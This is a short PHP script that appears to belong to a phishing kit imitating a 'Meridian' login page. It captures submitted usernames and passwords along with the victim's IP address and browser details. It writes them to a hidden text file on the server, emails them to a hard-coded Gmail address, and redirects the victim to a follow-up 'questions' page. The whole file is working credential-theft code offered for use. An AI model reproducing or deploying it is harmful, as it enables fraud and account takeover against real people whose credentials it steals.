 <?php

error_reporting(0);

$send = "medahnabil@gmail.com";

$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];

$data ="
--------------------------------------------
          IP       : $ip
--------------------------------------------
Number   : $user

Password : $pass
-----------------3|$en----------------------

";

$subj="Meridian - GOODLIFE"; 

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/DimaMohm3X.txt","a+");
fwrite($fp,"Meridian - GOODLIFE" . " | " . getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\nusername: " . $user  . "\npassword: " . $pass . "\n\n");
fclose($fp);
	
mail($send, $subj, $data . getenv("REMOTE_ADDR") . " | " . getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT']);


		   header("Location: questions.php");

?>
